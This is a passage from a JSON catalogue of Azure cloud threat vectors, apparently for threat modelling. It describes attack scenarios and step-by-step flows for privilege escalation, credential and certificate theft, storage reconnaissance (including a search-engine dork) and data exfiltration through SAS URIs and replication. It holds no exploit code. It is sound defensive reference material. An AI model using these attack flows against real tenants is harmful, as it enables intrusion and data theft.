                "description": "Port mapping in Azure refers to the process of exposing internal ports of virtual \nmachines (VMs), containers, or services to external networks, often through Azure \nLoad Balancers, Network Security Groups (NSGs), or NAT rules. This allows external \nusers or services to access resources inside a private Azure network by mapping \npublic ports to private ones.\n\n### How Port Mapping Can Be a Threat Vector\n\nPort mapping, if misconfigured or left unsecured, can introduce several security risks:\n\n- **Exposure of Internal Services:** Mapping internal ports to public endpoints \ncan expose services (e.g., RDP, SSH, HTTP) to the internet, making them targets \nfor scanning, brute-force attacks, and exploitation of vulnerabilities.\n- **Reconnaissance by Attackers:** Attackers can enumerate open ports by analyzing \nNSG rules or scanning Azure IP ranges, identifying which services are accessible \nand potentially vulnerable.\n- **Misconfigured NSGs:** If NSGs are not properly configured, they may inadvertently \nallow unrestricted access to sensitive ports, increasing the attack surface.\n- **Bypassing Security Controls:** Using non-standard port mappings \n(e.g., mapping RDP 3389 to a random high port) may provide slight obscurity but \ndoes not prevent targeted attacks, especially if attackers scan all ports.\n- **Container and VM Risks:** Improper port mapping in Azure container services \nor VMs can lead to exposure of management interfaces or application endpoints, increasing \nthe risk of unauthorized access or lateral movement within the environment.\n\n### Common Attack Scenarios\n\n- **Brute Force Attacks:** Exposed RDP (3389) or SSH (22) ports are frequent targets \nfor automated brute-force attempts.\n- **Service Exploitation:** Attackers may exploit known vulnerabilities on exposed \nports, especially if services are outdated or unpatched.\n- **Information Gathering:** Attackers use port mapping information to build a profile \nof the environment, identifying potential entry points for further attacks.\n"
            },
            "bb2501d5-99c7-44a6-ac5a-9510102d6611": {
                "name": "Azure - Principal Impersonation",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "This threat vector in Azure environments is a critical form of privilege escalation, \nwhere attackers abuse service principals or managed identities to elevate access \nwithin cloud resources. \n\n## Example Attack Scenario\n\nA common scenario involves an attacker gaining access to a compromised Azure DevOps \npipeline, often through stolen credentials or tokens. From there, the attacker exfiltrates \nService Principal credentials (which act as privileged identities for applications), \nand leverages those credentials to authenticate to the Azure environment. With control \nover a service principal assigned privileged roles (such as Cloud Application Administrator \nor those with Application.ReadWrite.All permissions), the attacker can perform high-impact \nactions, such as adding new federated domains, registering malicious applications, \nor even forging authentication tokens to impersonate any user\u2014potentially those \nwith Global Administrator rights.\n\n## Attack Goals and Impact\n\nThe primary goals of **Principal Impersonation** attacks include:\n- Gaining **persistent, high-level access** to cloud resources and administrative controls.\n- Bypassing access controls, enabling attackers to assume **any privileged or sensitive \nidentity** within the Azure Active Directory tenant.\n- **Exfiltration of data** from storage accounts or databases, creation of new virtual \nmachines for malicious purposes, and the registration of attacker-controlled applications \nfor ongoing access.\n- Achieving **domain-wide impact** by forging authentication tokens or manipulating \ndirectory federation, ultimately resulting in complete tenant takeover or escalation \nto Global Administrator.\n\n## Attack Flow and Methodology\n\nThe flow typically unfolds in these stages:\n\n1. **Credential Theft/Manipulation**: Attacker exfiltrates, creates, or adds credentials \n(secret keys, certificates) to a service principal or managed identity.\n2. **Impersonation**: Using the compromised identity, the attacker authenticates \nas the service principal and leverages assigned privileged roles or permissions \nto perform sensitive operations (e.g., managing federated domains, creating backdoor \naccounts, modifying authentication policies).\n3. **Privilege Escalation**: Attacker forges tokens or utilizes elevated permissions \nto impersonate higher-privilege users or global administrators, potentially by exploiting \nfederated SSO or Azure AD application registration features.\n4. **Persistence and Impact**: Additional malicious applications are registered, \nnew backdoor credentials are planted, and attacker actions may persist until discovered \nand remediated.\n"
            },
            "fa381d6e-92cd-4c96-a340-24df7b21e2b7": {
                "name": "Azure - Privileged Identity Management Role",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The threat vector describes the risk that an adversary may escalate privileges by \nabusing Privileged Identity Management (PIM) assignments or role activation features \nwithin Azure Active Directory. PIM is designed to provide just-in-time and approval-based \naccess to highly privileged roles (e.g., Global Administrator, Owner), instead of \npermanent assignment. However, if misconfigured or insufficiently monitored, PIM \nitself can become an avenue for privilege escalation attacks.\n\n### Example Attack Scenario\n\nAn attacker gains access to a regular Azure AD user account that is configured as \neligible for privileged role activation (such as Global Administrator) through PIM. \nThe attacker then activates the privileged role via Azure AD PIM, immediately acquiring \nelevated permissions. This could be done by interacting with Azure Graph API endpoints \nto trigger role eligibility schedules and activations, such as:\n\n- `GET https://graph.microsoft.com/beta/roleManagement/directory/roleEligibilitySchedules/{id}`\n- `GET https://management.azure.com/{scope}/providers/Microsoft.Authorization/roleEligibilityScheduleRequests/{roleEligibilityScheduleRequestName}?api-version=2020-10-01`\n\nThe attacker uses the newly gained privileges to:\n- Add themselves or an accomplice as a permanent or eligible member for other privileged roles.\n- Carry out further attacks with escalated access.[1]\n\n### Attack Goals and Impact\n\nThe main goals of abusing a PIM role assignment include:\n- **Persistence:** Staying undetected with elevated privileges for longer periods.\n- **Privilege Escalation:** Obtaining admin-level access across Azure AD and resources.\n- **Manipulation and Control:** Modifying security controls, configurations, or resource \naccess to facilitate lateral movement, data theft, or additional attacks.[3][1]\n- **Data Breach and Resource Manipulation:** Exfiltration of sensitive data or disruption \nof critical services.\n\nThe impact can include unauthorized administrative actions, permanent backdoors \nvia modified role assignments, data breaches, and complete compromise of the Azure environment.[4][3][1]\n\n### Attack Flow and Methodology\n\n1. **Reconnaissance:** Identify eligible users or accounts for PIM role activation \nin Azure AD or resources.\n2. **Initial Access:** Gain credentials for a user account eligible for PIM role activation.\n3. **Activation:** Use Azure AD PIM to activate the privileged role temporarily \nor request permanent assignment, triggering privileges using documented APIs and management endpoints.\n4. **Escalation and Manipulation:** Once privileges are obtained:    - Add or change eligible members in PIM.    - Modify resource permissions (via `RoleManagement.ReadWrite.Directory`).    - Abuse elevated access, e.g., create, delete, or alter resources and audit logs.\n5. **Persistence:** Maintain administrative access by adding themselves as eligible \nmembers or scheduling future eligibility.\n6. **Detection Evasion:** Exploit gaps in logging or monitoring or tamper with audit \nlogs if possible.\n"
            },
            "9b41d6cf-de4d-44d1-97cc-f3671f4ee5ab": {
                "name": "Azure - Public Accessible Resource",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "In Azure, this technique highlights the risk where certain resources\u2014commonly **Network Interfaces** \nand **Virtual Machines**\u2014have public IP addresses or open ports, making them directly \nreachable from the internet. Unlike other reconnaissance techniques, this isn\u2019t \njust about discovering resource metadata but about identifying resources configured \n(intentionally or not) for public access.\n\n#### How Attackers Use This Vector\n\n- **Discovery Phase:** Attackers or researchers employ automated tools and scan \ninternet-facing IP space, hunting for live Azure VMs, network interfaces, and endpoints \nwhose public exposure can be confirmed.\n- **Enumeration Approaches:**   - **Subdomain/Service Pattern Scanning:** Many Azure services use predictable   domain structures (e.g., `*.azurewebsites.net`, `*.blob.core.windows.net`).   Attackers enumerate these to find exposed resources.  - **Open Ports Scans:** Tools scan IPs for open RDP, SSH, web, or management ports.\n- **Public APIs and Metadata:** Some Azure resource information is available through \npublic APIs or unauthenticated metadata services, providing further opportunities \nfor adversaries to discover exposed resources.\n- **Real-World Tools:** Well-known tools include MicroBurst, AADInternals, and custom \nscripts for mass scanning.  \n#### Specific Azure Resources at Risk\n\n- **Network Interfaces:** Networking components that, if tied to public IPs, may \nexpose internal workloads.\n- **Virtual Machines:** Especially those configured with public IPs and ports like \nRDP (3389) or SSH (22) open.\n- **App Services and Blob Storage:** Though not explicitly listed in AZT103, these \nare also frequent targets for enumeration due to default public endpoints.\n- **Databases/Clusters:** Services like Azure Data Explorer or managed databases \nmay be misconfigured to allow public ingress.\n\n#### Security Implications\n\n- **Increased Attack Surface:** Exposing resources multiplies the number of direct \nentry points for adversaries.\n- **Brute-Force and Vulnerability Exploitation:** Resources with public connectivity \nare subject to constant automated attacks and vulnerability scans.\n- **Potential Lateral Movement:** Compromising one public resource can serve as \na foothold to move deeper into the Azure environment.\n"
            },
            "9edfeee4-63ee-49cc-ab7f-43a7e602ab58": {
                "name": "Azure - SAS URI Generation",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector enables attackers to exfiltrate or manipulate data by \ngenerating Shared Access Signature (SAS) URIs for Azure resources such as virtual \nmachine disks or storage containers, often without authentication or sufficient oversight.\n\n## Example Attack Scenario\n\nAn adversary with sufficient Azure permissions compromises a resource (like a VM \nor storage account) and generates an SAS URI for the VM disk or storage container. \nThe attacker then uses the generated SAS URI to download or exfiltrate sensitive \ndata, such as disk images containing credentials or proprietary information. For \nexample, a well-publicized incident involved researchers leaking terabytes of confidential \ndata after distributing SAS-protected links with overly broad permissions.\n\n## Attack Goals and Impact\n\n- The key **attack goal** is **data exfiltration** or unauthorized access to sensitive \ndata without detection or need for ongoing authentication.\n- Attackers can download full VM disks, access entire storage containers, manipulate \ndata, or even inject and delete files if permission scopes are broad.\n- **Impact** includes extensive data breaches, loss of intellectual property, ransom \ndemands, or irreparable harm due to deletion or manipulation of business-critical resources.\n- SAS URIs are particularly dangerous because, once generated, they can't be easily \nrevoked, and their permissions/duration may be overprovisioned by design or accident.\n\n## Attack Flow and Methodology\n\n1. **Privilege Acquisition**: Attacker gains access to an Azure resource or user \naccount with permissions to generate SAS URIs.\n2. **SAS Generation**: Using privileged actions (such as 'Microsoft.Compute/disks/beginGetAccess/action' \nfor VM disks or 'Microsoft.Storage/storageAccounts/listAccountSas/action' for Storage Accounts), \nthe attacker generates a SAS URI for the target resource.\n3. **Data Access or Exfiltration**: The attacker uses the SAS URI to access, download, \nmodify, or delete data directly, often bypassing logging or security controls if \nnot properly monitored.\n4. **Persistence and Stealth**: Since SAS URIs can have long or indefinite validity \nperiods and are rarely tracked, the attacker maintains ongoing access until the \ntoken expires or underlying keys are rotated.\n5. **Cleanup or Covering Tracks**: In advanced scenarios, the attacker removes evidence \nof token generation and exfiltration or uses the access to establish further persistence \nwithin the environment.\n"
            },
            "c4edae81-5790-4b9c-88b7-d11d6985b1a4": {
                "name": "Azure - Service Principal Secret Reveal",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector involves an adversary revealing a service principal's \nsecret (a credential) in plain text, which can then be used for unauthorized access \nand further attacks.\n\n### Example Attack Scenario\n\nAn adversary targets an Azure Function App that uses a service principal for authentication. \nThe attacker exploits the Function App by manipulating its application logic to \nreveal the service principal's secret in plain text. This secret, which acts like \na password, provides direct authentication access as the service principal identity, \nenabling the attacker to escalate privileges or move laterally within the Azure environment.\n\n### Attack Goals and Impact\n\nThe primary goal of the \"Service Principal Secret Reveal\" attack is to gain unauthorized \naccess to service principal credentials. With these credentials, the attacker can:\n\n- Authenticate as the service principal identity.\n- Access resources and perform actions permitted to the service principal.\n- Potentially escalate privileges by abusing the service principal's permission scope.\n- Maintain persistence in the environment by leveraging the stolen secret.\n- Move laterally across Azure resources to further compromise the target environment.\n\n### Attack Flow and Methodology\n\n1. **Identify Target Service Principal**: The attacker discovers that the Function \nApp uses a service principal for authentication.\n2. **Manipulate Function App Logic**: The attacker modifies the Function App's code \nor configuration to extract and reveal the service principal's secret in plain text.\n3. **Secret Disclosure**: The service principal secret is exposed and accessible \nto the attacker.\n4. **Credential Use**: The attacker uses the secret to authenticate as the service \nprincipal identity.\n5. **Privilege Escalation and Lateral Movement**: Using the service principal's \npermissions, the attacker can escalate privileges and move laterally across Azure resources.\n6. **Persistence and Further Exploitation**: The attacker may maintain persistent \naccess, harvest additional credentials, or exfiltrate sensitive data.\n"
            },
            "4805a7a1-807c-4869-aefe-3047823f64b5": {
                "name": "Azure - Soft-Delete Recovery",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector deals with adversaries exploiting the soft-delete state \nof resources to restore sensitive or critical data that was intended for deletion. \nBelow is a detailed analysis including an example scenario, attack goals and impact, \nand attack flow.\n\n### Example Attack Scenario\n\nAn attacker obtains administrative access to an Azure subscription, targets a critical \nasset\u2014for example, a Key Vault, Storage Account, or a backed-up Virtual Machine\u2014and \ndeletes it from the environment. Because Azure\u2019s soft delete is enabled (default \nfor many services), the deleted resource enters a \"soft-deleted\" state rather than \nbeing permanently erased. The adversary, maintaining access, then restores the asset \nfrom its soft-deleted state at a later time, thus retrieving encryption keys, sensitive \nsecrets, storage blobs, or entire VM backup images. This could be leveraged for \nfurther compromise, data exfiltration, or extortion, such as during a ransomware \nattack where the goal is to restore and leak or manipulate sensitive data.\n\n### Attack Goals and Impact\n\n- The primary goal is to **retrieve or reinstate sensitive data or backup artifacts** \nwhich were meant to be irretrievably deleted, thus bypassing standard data sanitization \nor incident response clean-up.\n- Attackers may also restore resources to maintain persistence, retrieve secrets, \nor conduct business disruption by manipulating the retention window of these soft-deleted resources.\n- The impact includes:  - **Regaining access to critical secrets or data thought to be purged** (e.g.,   access keys in a Key Vault, confidential files in a Storage Account, or disk images   from VM backups).  - **Circumventing incident remediation efforts** (e.g., after a ransomware event   when defenders try to remove access, attackers reverse the cleanup).  - **Using restored data for secondary attacks**, such as extortion by leaking   previously \"deleted\" data, or using recovered credentials to move laterally within   or outside the environment.\n\n### Attack Flow and Methodology\n\n- **Resource Deletion**: The attacker deletes valuable resources (such as Key Vaults, \nStorage Accounts, or VM Backups).\n- **Soft Delete Retention**: Azure's soft-delete feature retains these resources \nfor a specified period (typically 14 days by default, extendable up to 180 days).\n- **Resource Recovery**: Using recovered or maintained admin access, the attacker \nissues recovery actions, restoring the soft-deleted objects back to an active state, \nand proceeds to exfiltrate or abuse the recovered data.\n- **Post-Exploitation**: Data is accessed, secrets are used for persistence or lateral \nmovement, or assets are further manipulated or exposed depending on the attacker\u2019s \nobjectives.\n"
            },
            "b6543cff-2e86-4fe6-afb7-6d3595188190": {
                "name": "Azure - Steal Service Principal Certificate",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector involves adversaries targeting certificates used by \nAzure service principals (especially in Automation Accounts using `RunAs` accounts) \nto gain unauthorized access. \n\n### Example Attack Scenario\n\nAn attacker gains access to an Azure Automation Account that uses a RunAs account \nfor automation workflows. By editing or creating a new Runbook in the compromised \nAutomation Account, the adversary modifies the runbook to extract and display the \nprivate certificate associated with the Service Principal. Once the runbook is executed, \nthe certificate is exposed, often as plain text in output logs or variables. The \nattacker then downloads or copies this certificate file for later use.\n\n### Attack Goals and Impact\n\nThe attacker\u2019s main goal is to obtain a valid authentication method for the targeted \nservice principal by stealing its certificate. With the certificate and its private \nkey, the attacker can:\n- Authenticate as the service principal to Azure AD and access resources the principal \nis authorized to access.\n- Perform privilege escalation or lateral movement by leveraging the service principal's \npermissions, possibly affecting critical resources or sensitive operations.\n- Maintain persistence and evade detection since service principal authentication \nis a common and legitimate operational pattern in cloud automation.\n\n### Attack Flow and Methodology\n\n1. Attacker identifies runbooks and determines which ones use `RunAs` authentication.\n2. Adversary writes or edits a runbook to programmatically extract the `RunAs` certificate \nfrom its local storage or configuration.\n3. Attacker executes the runbook, which outputs or transmits the certificate (sometimes \nvia logging or storage).\n4. The adversary captures and exfiltrates the certificate and private key material, \neither through Azure portal log downloads, storage account access, or interactive \nsession output.\n5. With the certificate, the attacker can authenticate to Azure as the service principal, \nperform malicious operations, and potentially move laterally or escalate privileges, \ndepending on the permissions assigned to the compromised principal.\n"
            },
            "53f4e2f0-7d11-4629-bb26-905993a589db": {
                "name": "Azure - Storage account reconnaissance",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Azure storage account reconnaissance refers to the initial phase of cyberattacks \nwhere adversaries gather information about target storage accounts to identify vulnerabilities \nand plan subsequent attacks. This threat vector is critical as it enables attackers \nto map out potential entry points and weak configurations in cloud storage environments.\n\n### Techniques and Methods  \n**Storage account discovery**:  \n- Attackers use methods like DNS reconnaissance (e.g., searching `*.blob.core.windows.net` subdomains) \nand brute-forcing account names to identify active Azure storage accounts.  \n- Publicly available tools such as **Microburst** and **BlobHunter** automate the \nenumeration of storage accounts and containers.  \n\n**Public container/blob enumeration**:  \n- Adversaries exploit misconfigured public access settings (e.g., containers set to \"container\" or \"blob\" access levels) \nto list and access sensitive data without authentication.  \n- Techniques include analyzing DNS records, web page source code, and cloud metadata \nfor storage account URLs.  \n\n### Attack Implications  \nSuccessful reconnaissance can lead to:  \n1. **Data exposure**: Identification of publicly accessible containers with sensitive data.  \n2. **Lateral movement**: Discovery of storage accounts linked to higher-privileged \nresources (e.g., Azure Functions) for token theft and privilege escalation.  \n3. **Malware distribution**: Mapping storage accounts used for hosting malicious \ncontent via features like static websites.  \n"
            },
            "942ed69c-700a-469a-9591-07b87815a909": {
                "name": "Azure - Storage Account Replication",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The following threat vector enables adversaries to misuse Azure Storage's replication \nfeatures for data exfiltration or to facilitate other attacks with significant business impact.\n\n## Example Attack Scenario\n\nAn attacker compromises access to a victim's Azure Storage account, obtaining enough \npermissions to configure **object replication**. The attacker then creates their \nown storage account in a different Azure tenant or region and establishes a replication \npolicy from the victim's storage. As a result, sensitive or operational data is \nasynchronously and automatically copied from the victim\u2019s container to the attacker's \nenvironment\u2014potentially outside tenant or even cross-cloud provider lines\u2014without \nfurther interaction. The attacker can now access the replicated content at will, \nmaintaining persistence and visibility even if their original access to the victim \naccount is revoked.\n\n## Attack Goals and Impact\n\n- **Exfiltration**: The primary goal is the **covert exfiltration of data**\u2014potentially \nat massive scale and with minimum detection, because the process leverages legitimate \nreplication mechanisms.\n- **Persistence and Stealth**: By using cross-region or cross-tenant replication, \nan attacker ensures ongoing access to copied data even after being discovered and \nevicted from the original environment.\n- **Evasion and Regulatory Breach**: Since Azure Storage object replication can \noccur across geographical boundaries, this attack can make detection harder and \nmay also result in regulatory compliance violations (e.g., unauthorized cross-border \ndata transfers).\n- **Potential for Secondary Impact**: With replicated data, attackers may enable \nransomware (encrypting or destroying primary data, but retaining a copy elsewhere), \nenable further attacks by gleaning credentials or configuration details from exfiltrated \nfiles, or deliver **malware** to victim environments using inbound replication.\n\n## Attack Flow and Methodology\n\n1. The adversary enumerates storage resources, searches for containers of interest, \nand assesses the feasibility of replication configuration.\n2. Using their access, the attacker creates an **object replication policy** from \nvictim storage to a destination account they control, potentially in a different \ngeographic region or Azure tenant.    - Outbound replication exfiltrates data; inbound can inject payloads.    - Cross-tenant replication may currently require explicit configuration, and     new Azure defaults restrict this, but legacy or misconfigured accounts remain vulnerable.\n3. Replication occurs asynchronously, repeatedly syncing new or changed objects. \nThe attacker harvests data from their own account, separate from the victim\u2019s monitoring \nand controls, thus bypassing many detection points.\n4. Depending on their goal, the attacker may leave replication running for long-term \npersistence or attempt to erase traces from the victim environment.\n"
            },
            "c856d1b5-b351-49ad-b8f4-8ab9720ba510": {
                "name": "Azure - Storage blobs data collection",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The threat vector refers to techniques used by attackers to discover, enumerate, \nand exfiltrate data from Azure Blob Storage containers, often due to misconfigurations \nthat allow unauthorized or public access to sensitive data. This is commonly known \nas \"blob hunting\" and is a significant risk for organizations using cloud storage.\n\n## Attack Techniques\n\n### 1. Blob Hunting and Enumeration\n\n- **Blob Hunting**: Attackers attempt to discover Azure storage accounts, containers, \nand blobs by guessing or brute-forcing names, leveraging predictable naming conventions, \nor using automated tools such as MicroBurst and BlobHunter.\n- **Enumeration Process**:  - **Storage Account Discovery**: Attackers identify potential storage account   names, often using subdomain enumeration or company naming conventions (e.g., `companyname.blob.core.windows.net`).  - **Container Enumeration**: Once the account is found, attackers guess or enumerate   container names, which are often generic (e.g., \"images\", \"backups\").  - **Blob Listing**: If a container allows anonymous access, attackers can list   and access all blobs within it, potentially exposing sensitive files.\n\n### 2. Exploiting Misconfigurations\n\n- **Public Access Settings**:  - **Private Access**: Only authorized users can access data (most secure).  - **Blob Access**: Anyone with the blob URL can access the data, but cannot list   all blobs.  - **Container Access**: Anyone can list and access all blobs in the container,   if they know the container name.\n- Attackers exploit misconfigurations where containers are set to \"Blob\" or \"Container\" \naccess, allowing unauthorized data collection.\n\n### 3. Automated Tools\n\n- **BlobHunter**: Scans Azure blob storage for publicly accessible blobs and reports \nmisconfigured containers.\n- **MicroBurst**: Automates enumeration and brute-forcing of storage account and \ncontainer names.\n- **Legitimate Tools Misused**: Tools like Azure Storage Explorer and AzCopy can \nbe used by attackers for bulk data exfiltration if credentials or access are compromised.\n"
            },
            "41f57a57-1ed6-407e-bb70-a0f6ab52af10": {
                "name": "Azure - Storage Blobs Reconnaissance",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Reconnaissance targeting Azure Storage Blobs involves gathering intelligence to identify\nexposed storage accounts, containers, and blobs-often without authentication or detection.\nAzure\u2019s predictable URL structure, common naming conventions, and potential for\nmisconfiguration make it a prime target for such activities.\n\n### Discovery of Storage Accounts\n\n- **DNS and Subdomain Enumeration:**  \nEach Azure Storage account is accessible via a unique subdomain\n(e.g., `yourstorageaccount.blob.core.windows.net`).   \nAttackers use DNS enumeration tools (like `dnscan`) and wordlists to guess or \ndiscover valid storage account names. They often use company names, abbreviations, \nor product names as starting points.\n\n- **Search Engine Dorking:**  \nPublicly accessible blobs and containers may be indexed by search engines. Attackers \nleverage advanced search queries (Google dorking), such as `site:*.blob.core.windows.net`, \nto find open blob storage accounts and even specific file types (e.g., `.csv`, `.xlsx`) \nor keywords like `\"password\"`.\n\n### Enumeration of Containers and Blobs\n\n- **URL Pattern Guessing:**  \nAzure Blob Storage uses predictable URL patterns for containers and blobs. Attackers \nautomate requests to likely container names (e.g., `backups`, `images`, `prod`) \nand blob names, increasing the odds of finding exposed data.\n\n- **Automated Scanning Tools:**  \nTools like MicroBurst, goblob, and custom scripts are used to automate the enumeration \nof storage accounts, containers, and blobs. These tools can quickly test thousands \nof possible names, scaling up the reconnaissance process.\n\n- **Custom Wordlists:**  \nAttackers may build custom dictionaries based on the target\u2019s business, products, \nor previously leaked information to improve the accuracy of their enumeration efforts.\n\n### Analysis of Exposed Data and Metadata\n\n- **Monitoring Access Patterns:**  \nBy analyzing metadata (timestamps, blob sizes, file types), attackers can infer \nwhich blobs or containers are most likely to contain sensitive or valuable information.\n\n- **Chaining Exposures:**  \nIf attackers find an exposed blob, they may discover references within the files \nthemselves (e.g., database connection strings, links to other storage accounts), \nallowing them to recursively enumerate and compromise further resources.\n\n### Tenant and Service Enumeration\n\n- **Azure Tenant Discovery:**  \nAttackers can leverage known company domains or public APIs to enumerate Azure tenants \nand services, including blob storage endpoints. Tools like MicroBurst and AADInternals \nautomate the discovery of tenant IDs and service endpoints, providing additional \nreconnaissance data.\n\n### Reconnaissance Characteristics\n\n- **Silent and Non-Intrusive:**  \nMost reconnaissance activities are passive and do not require authentication, making \nthem difficult to detect until exploitation occurs.\n\n- **Scalable and Automated:**  \nAttackers can automate the entire process, rapidly scanning large numbers of potential \nstorage accounts and containers.\n\n### Real-World Impact\n\n- **Sensitive Data Exposure:**  \nEven a single misconfigured blob can expose sensitive data, credentials, or internal \ndocumentation, which can be leveraged for further attacks.\n\n- **Pivoting and Lateral Movement:**  \nExposed blobs may contain information that allows attackers to pivot to other services \nor escalate their access within the target environment.\n"
            },
            "2d7ed070-e5c5-4796-b150-ea1d02ed1785": {
                "name": "Azure - Storage container reconnaissance",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Azure storage container reconnaissance is a threat vector involving adversaries \nactively or passively gathering information about Azure Storage accounts and their \ncontainers to identify potential targets for further exploitation. This reconnaissance \nphase is critical for attackers to map the attack surface, discover misconfigurations, \nand locate storage resources that may be exposed or contain sensitive data.\n\n## Key Techniques Used in Azure Storage Container Reconnaissance\n\n- **Storage Account Discovery**: Attackers enumerate Azure Storage account names \nto find active accounts. Techniques include:  - Using search engine dorks (e.g., `site:*.blob.core.windows.net`)  - Brute-force enumeration of account names  - Leveraging public scanning tools such as Microburst and BlobHunter  - Crawling for storage endpoints referenced in public websites or code repositories\n\n- **Public Container Discovery**: Once a storage account is identified, attackers \nenumerate container names within that account. They attempt to:  - List container names by guessing or brute-forcing  - Use scripts or automated tools to scan for containers with public or misconfigured access\n\n- **DNS/Passive DNS Enumeration**: Attackers query DNS records or use passive DNS \ndatabases to identify valid Azure Storage account names in the wild. This can reveal \nstorage endpoints that may not be directly linked from public sources.\n\n- **Victim-Owned Website Analysis**: Attackers analyze a target\u2019s own websites for \nreferences or direct links to Azure Storage containers, which can reveal storage \naccount URLs and access patterns.\n\n## Tools and Methods\n\n- **Automated Scanning Tools**: Tools like Microburst and BlobHunter automate the \nprocess of discovering storage accounts and containers by scanning for open or misconfigured \nresources.\n- **Scripting and Brute-Force**: Custom scripts may be used to guess container names \nor enumerate access permissions.\n- **Search Engine Indexing**: Attackers use indexed URLs from search engines to \nfind publicly accessible containers.\n"
            },
            "0815bc77-169d-4320-aa32-770cf062509a": {
                "name": "Azure - Unmanaged Scripting",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries can use Azure function apps, automation accounts, or other scriptable \ncloud resources, to execute malicious code or operations.\n\n## Example Attack Scenario\n\nAn attacker gains access to credentials or a compromised user account with permissions \nto create or modify Azure Function Applications. The attacker then uploads a malicious \nscript (PowerShell, Python, etc.) into a Function App that is linked to production \nresources. Upon execution, this script can perform unauthorized actions\u2014such as \nexfiltrating data, creating new users, or altering configurations\u2014using the inherent \nprivileges of the Function App. This does not require direct access to virtual machines \nor servers, but abuses the cloud-native scripting capabilities.\n\n## Attack Goals and Impact\n\n- **Privilege Escalation**: By abusing scripting environments, an attacker may use \na compromised identity to escalate their access rights, gaining broader or administrative \ncontrol over Azure resources.\n- **Data Exfiltration**: Malicious scripts can be designed to access sensitive information \nlike secrets, credentials, or customer data and move it off the platform.\n- **Persistence and Lateral Movement**: Attackers can establish persistence by deploying \nscripts that create new accounts, tokens, or credentials, or by moving laterally \nto other services and resources in the cloud environment.\n- **Service Disruption**: Unmanaged scripts may also be used to delete, modify, \nor take resources offline, impacting business continuity.\n\n## Attack Flow and Methodology\n\n1. **Deployment of Malicious Script**: The attacker uploads and executes a script \nin an unmanaged environment (such as Azure Functions, Automation Accounts, or pipelines) \nusing operational permissions like \"Microsoft.Web/sites/functions/write\".\n2. **Execution of Malicious Actions**: The script leverages privileged roles to \nperform sensitive operations (like reading secrets, writing corrupted configurations, \nor creating service identities).\n3. **Evade Detection**: The attacker may implement techniques to hide their activities, \nsuch as using legitimate accounts, storing scripts in hard-to-monitor locations, \nor obfuscating code logic.\n4. **Persistence, Lateral Movement, or Exfiltration**: The attacker continues their \ncampaign, using the script to create new credentials, pivot to additional resources \nor exfiltrate sensitive data.\n"
            },
            "2743bf18-3b86-4721-bf3e-153dcda0b149": {
                "name": "Azure - Valid Credentials",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "This threat vector within the Initial Access phase represents a significant risk \nin Azure environments. This attack technique\u2014formally designated around adversaries \nacquiring and abusing legitimate authentication credentials to gain access to Azure \nresources or Azure Active Directory (AzureAD).\n\n### Example Attack Scenario\n\n- The attacker logs in directly to the Azure Portal or via CLI (e.g., `az login`) \nusing valid credentials.\n- Once inside, the attacker can enumerate resources, exfiltrate data, manipulate \nconfigurations, or leverage the account for further attacks, depending on the permissions \ngranted to the compromised account.\n- If privileged service principal credentials are obtained, the attacker can use \nsecrets or certificates to automate access and escalate privileges.\n\n### Attack Goals and Impact\n\n- **Primary Goals:**  - Establish initial access to Azure environments in a stealthy, low-noise manner   by using valid, non-malicious authentication flows.  - Access sensitive data, manipulate cloud resources, and potentially escalate   privileges or persist within the target environment.\n\n- **Impact:**  - Complete compromise of Azure resources accessible by the stolen account (files,   databases, VMs, identity services, etc.).  - Potential for privilege escalation if the account is eligible for higher roles   or Privileged Identity Management (PIM).  - Ability to create backdoors, perform lateral movement, and evade detection (since   all actions appear legitimate).  - Depending on account privileges, ransomware deployment, data exfiltration, and   broad access to organizational assets may occur.\n\n### Attack Flow and Methodology\n\n1. **Reconnaissance**  - Attackers gather information on users or service principals, identifying potential   targets through open-source intelligence, misconfigurations, or enumeration of   publicly accessible resources.\n\n2. **Credential Acquisition**  - Common methods: phishing (email/SMS/voice), brute-force/password spraying,   harvesting credentials from previous breaches, or exploiting cloud API/application   misconfigurations.  - Service principal secrets/certificates may be obtained from publicly accessible   repositories, misconfigured code, or automation scripts.\n\n3. **Authentication**  - Adversary logs into Azure Portal or invokes cloud APIs using the acquired credentials.  - For service principals: authentication occurs via CLI or programmatic access   using certificates/secrets.\n\n4. **Enumeration and Expansion**  - Mapping out resources, roles, permissions; searching for sensitive data or   additional high-value targets.  - Assessing role activation and privilege escalation opportunities (e.g., via   PIM or RBAC misconfigurations).\n\n5. **Execution of Attack Objectives**  - Data exfiltration, sabotage, account persistence (creating additional user   accounts or credentials), lateral movement to other resources, or exploitation   for financial gain.  - Actions are typically performed under the guise of the legitimate account to   avoid detection.\n\n6. **Persistence and Defense Evasion**  - Adversaries may create new accounts, modify access policies, or abuse automation   to ensure continued access.  - Use of valid credentials enables attackers to blend with legitimate user activity,   thus evading many traditional security detection systems.\n"
            },
            "3435c5fd-1069-40ee-ae79-54c672ce454d": {
                "name": "Azure - Virtual Machine Scripting",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
